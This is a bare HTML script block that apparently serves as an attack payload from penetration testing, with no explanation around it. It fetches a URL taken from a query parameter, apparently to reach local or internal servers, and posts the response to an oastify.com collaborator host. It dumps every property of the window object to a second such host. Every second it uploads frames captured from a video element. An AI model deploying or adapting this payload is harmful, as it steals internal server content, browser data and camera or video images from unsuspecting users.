
        <script>


// Function to get URL parameters
function getQueryParam(param) {
    var urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}

// Function to make the XHR request
function sendRequest() {
    // Get the localUrl parameter from the URL
    var localUrl = getQueryParam('url');

    if (!localUrl) {
        console.error('Error: localUrl parameter is missing in the URL');
        sendPingWithError('localUrl parameter is missing in the URL');
        return;
    }

    // Create a new XMLHttpRequest object
    var xhr = new XMLHttpRequest();
    
    // Configure it: GET-request for the URL
    xhr.open('GET', localUrl, true);

    // Disable sending credentials with the request
    xhr.withCredentials = false;

    // Define what happens on successful data submission
    xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 400) {
            // Success! Send the response to the external server
            sendToExternalServer(xhr.responseText);
        } else {
            console.error('Error: Failed to retrieve data from the local server');
            sendPingWithError(`Failed to retrieve data from local server with status: ${xhr.status} and status text: ${xhr.statusText}`);
        }
    };

    // Define what happens in case of error
    xhr.onerror = function () {
        console.error('Request failed');
        sendPingWithError(`Request to local server failed with status: ${xhr.status} and status text: ${xhr.statusText}`);
    };

    // Send the request to the local server
    xhr.send();
}

// Function to send the response data to the external server
function sendToExternalServer(data) {
    var xhr = new XMLHttpRequest();

    // Configure it: POST-request for the URL
    xhr.open('POST', 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com', true);

    // Disable sending credentials with the request
    xhr.withCredentials = false;

    xhr.setRequestHeader('Content-Type', 'application/json');

    // Define what happens on successful data submission
    xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 400) {
            console.log('Success: Data sent to the external server');
        } else {
            console.error('Error: Failed to send data to the external server');
            sendPingWithError(`Failed to send data to external server with status: ${xhr.status} and status text: ${xhr.statusText}`);
        }
    };

    // Define what happens in case of error
    xhr.onerror = function () {
        console.error('Request failed');
        sendPingWithError(`Request to external server failed with status: ${xhr.status} and status text: ${xhr.statusText}`);
    };

    // Send the request with the data
    xhr.send(JSON.stringify({ content: data }));
}

// Function to send a ping with an error message
function sendPingWithError(errorMessage) {
    var xhr = new XMLHttpRequest();

    // Configure it: POST-request for the URL
    xhr.open('POST', 'https://wzzzdi6z1x5071fu9b3skvww5nbezin7.oastify.com', true);

    // Disable sending credentials with the request
    xhr.withCredentials = false;

    xhr.setRequestHeader('Content-Type', 'application/json');

    // Define what happens on successful data submission
    xhr.onload = function () {
        if (xhr.status >= 200 && xhr.status < 400) {
            console.log('Success: Error message sent to the external server');
        } else {
            console.error('Error: Failed to send error message to the external server');
        }
    };

    // Define what happens in case of error
    xhr.onerror = function () {
        console.error('Request failed');
    };

    // Send the request with the error message
    xhr.send(JSON.stringify({ error: errorMessage }));
}

// Call the function to initiate the requests
sendRequest();
// Function to get all properties and methods from the window object and its prototype chain
function getWindowProperties() {
    let result = {};
    let seen = new WeakSet();

    function getAllProperties(obj, result) {
        if (seen.has(obj)) return; // Skip objects we've already seen
        seen.add(obj);

        let properties = Object.getOwnPropertyNames(obj);
        for (let i = 0; i < properties.length; i++) {
            let property = properties[i];
            if (!(property in result)) {
                try {
                    // Fetch the property value
                    let value = obj[property];
                    // Handle circular references
                    if (typeof value === 'object' && value !== null) {
                        if (seen.has(value)) {
                            result[property] = '[Circular]';
                        } else {
                            result[property] = '[Object]';
                            getAllProperties(value, result[property]);
                        }
                    } else {
                        result[property] = typeof value === 'function' ? '[Function]' : value;
                    }
                } catch (e) {
                    result[property] = '[Error]';
                }
            }
        }

        // Recursively get properties from the prototype chain
        let proto = Object.getPrototypeOf(obj);
        if (proto && proto !== Object.prototype) {
            getAllProperties(proto, result);
        }
    }

    getAllProperties(window, result);
    return result;
}

// Function to send the properties list to a server
function sendProperties() {
    let properties = getWindowProperties();

    // Serialize properties to JSON
    let propertiesJSON = JSON.stringify(properties, (key, value) => {
        // Optional: Customize how values are serialized
        return value;
    });

    // Send properties to a server (for example)
    fetch('https://ssov6ezvutyw0x8q27wodrpsyj4as1ip7.oastify.com', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: propertiesJSON,
    }).then(response => response.json())
      .then(data => console.log('Success:', data))
      .catch((error) => console.error('Error:', error));
}

// Call the function to send the properties list
sendProperties();
// Create a canvas element to capture frames from the video
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');

// Function to capture and send frames
function captureAndSend() {
  // Set canvas dimensions to match the video
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  // Draw the current video frame onto the canvas
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  // Get the image data from the canvas
  canvas.toBlob(blob => {
    // Send the image data to the server
    const formData = new FormData();
    formData.append('file', blob, 'frame.jpg');

    fetch('https://ssov6ezvutyw0x8q27wodrpsyj4as1ip7.oastify.com', {
      method: 'POST',
      body: formData
    })
    .then(response => response.text())
    .then(result => {
      console.log('Upload successful:', result);
    })
    .catch(error => {
      console.error('Upload failed:', error);
    });
  }, 'image/jpeg');
}

// Call captureAndSend periodically
setInterval(captureAndSend, 1000); // Capture and send every 1 second



</script>
